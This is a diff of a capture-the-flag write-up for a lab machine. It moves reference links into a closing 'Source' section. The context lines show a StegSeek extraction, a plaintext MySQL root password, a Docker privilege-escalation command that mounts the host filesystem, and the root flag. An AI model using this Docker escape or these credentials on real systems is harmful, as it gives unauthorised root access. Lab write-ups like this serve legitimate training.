@@ -79,9 +79,6 @@ StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
 [i] Extracting to "musicbox.jpg.out"
 ```
 
-help : https://tiagotavares.io/2020/12/chillhack-1-vulnhub/
-help : https://blog.keiran.scot/privilege-escallation-with-docker-56dc682a6e17
-
 ### I thought I had found something but it was a rabbit hole
 ```bash
 mysql -u root -p : !@m+her00+@db
@@ -106,6 +103,9 @@ docker run -it -v /:/mnt alpine chroot /mnt
 ```
 ## Root FLAG
 ```cat /root/root.txt``` : EPI{Th3_Th1N_M4n_1S_C0m1Ng}
+
+### Source 
+https://tiagotavares.io/2020/12/chillhack-1-vulnhub/ | https://blog.keiran.scot/privilege-escallation-with-docker-56dc682a6e17
 
 
 
